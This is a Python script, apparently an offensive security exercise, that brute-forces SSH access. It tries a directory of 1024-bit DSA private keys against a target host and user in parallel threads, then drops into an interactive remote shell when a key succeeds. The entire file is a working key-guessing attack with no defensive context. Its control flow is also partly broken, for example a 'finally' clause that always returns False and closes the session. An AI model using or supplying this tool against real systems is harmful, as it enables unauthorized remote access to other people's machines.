
import sys
import pexpect
from pexpect import pxssh
import threading
import os


host = "127.0.0.1"
user = "tim"
KEYSPATH = "../dsa/1024/"
MAX_CONNECTIONS = 10 #default max ssh sessions for Linux
found = False
threads = []
connString = ""
screenLock = threading.Semaphore(value = 1)

def tryKey(k):
    try:
        global found,threads
        screenLock.acquire()
        print(k)
        child = pxssh.pxssh()
        child.login(server=host,username=user,ssh_key=KEYSPATH + k)
        found = True
        print("\nKey found: Press Enter to login to remote shell.")
        input()
        child.interact()
        return True
    except pxssh.ExceptionPxssh as err:
        pass
    finally: 
        screenLock.release()
        child.close()
        return False


if(len(sys.argv)>1):
    host = sys.argv[1]

if(len(sys.argv)>2):
    user = sys.argv[2]
connString = "ssh " + user + "@" + host

try:
   private_keys = os.listdir(KEYSPATH)
except OSError as err:
    print(err)
    exit(1)

while(not found):
    for i in range(MAX_CONNECTIONS):
        if(found):
            break
        if(len(private_keys)==0):
            print("Keys exhausted. No matches. Exiting.")
            exit(0)

        k = private_keys.pop()
        t = threading.Thread(target=tryKey,args=[k])
        threads.append(t)
        t.start()
    

    for t in threads:
        t.join()
        threads.remove(t)



